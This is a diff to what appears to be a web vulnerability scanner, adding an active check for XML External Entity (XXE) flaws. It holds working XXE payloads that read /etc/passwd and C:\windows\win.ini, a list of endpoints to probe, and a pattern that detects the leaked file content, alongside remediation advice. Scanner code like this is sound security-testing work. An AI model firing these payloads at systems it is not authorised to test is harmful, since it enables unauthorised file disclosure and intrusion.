@@ -356,6 +356,41 @@ def _scan_debug(ip: str, port: Port, base: str, auth) -> list[Vuln]:
     return out
 
 
+# XXE: POST an external-entity XML body to likely XML endpoints; a hit returns the
+# file content, which only appears if the parser resolved the entity (zero-FP).
+_XXE_LINUX = ('<?xml version="1.0"?>\n'
+              '<!DOCTYPE recce [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+              '<recce>&xxe;</recce>')
+_XXE_WIN = ('<?xml version="1.0"?>\n'
+            '<!DOCTYPE recce [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
+            '<recce>&xxe;</recce>')
+_XXE_HIT = re.compile(r"root:.*:0:0:|\[fonts\]|for 16-bit app support|\[extensions\]")
+_XXE_PATHS = ["/", "/api", "/api/xml", "/xmlrpc.php", "/services", "/soap", "/ws",
+              "/rest", "/upload", "/import"]
+
+
+def _scan_xxe(ip: str, port: Port, base: str, auth) -> list[Vuln]:
+    """XML External Entity file read. POSTs an external-entity XML body to likely XML
+    endpoints; flags only when the referenced file's content comes back (zero-FP)."""
+    probes = [(p, _XXE_LINUX) for p in _XXE_PATHS]
+    probes += [("/", _XXE_WIN), ("/api", _XXE_WIN)]        # Windows variant, root + /api
+    for path, payload in probes:
+        extra = dict(auth or {})
+        extra["Content-Type"] = "application/xml"
+        r = _fetch(ip, port, path, method="POST", body=payload, auth=extra)
+        if r and r[2] and _XXE_HIT.search(r[2]):
+            what = "/etc/passwd" if "root:" in r[2] else "C:\\windows\\win.ini"
+            return [_mk(ip, port, "web-xxe", "critical",
+                        f"XML External Entity (XXE) file read via {path}", ["CWE-611"],
+                        f"POST {base}{path} with an external-entity XML body returned "
+                        f"{what} content - the XML parser resolves external entities "
+                        "(arbitrary file read; also an SSRF + billion-laughs DoS surface).",
+                        "Disable DTDs / external entities in the XML parser "
+                        "(FEATURE_SECURE_PROCESSING, disallow-doctype-decl).",
+                        confidence="confirmed")]
+    return []
+
+
 def _find_login_form(ip: str, port: Port, body: str, auth):
     """Locate a login form (root page or a common login path). Returns (form, action)."""
     for cand_body, cand_path in [(body, "/")] + [(None, p) for p in _LOGIN_PATHS]:
@@ -2297,6 +2332,7 @@ def scan_endpoint(ip: str, port: Port, active: bool = True,
     findings.extend(_scan_debug(ip, port, base, auth))
     if active:
         findings.extend(_scan_nosql(ip, port, base, body, auth))
+        findings.extend(_scan_xxe(ip, port, base, auth))
     findings.extend(_scan_backups(ip, port, base, auth))
     findings.extend(_scan_reflection(ip, port, base, auth))
     findings.extend(_scan_js(ip, port, base, body, auth))
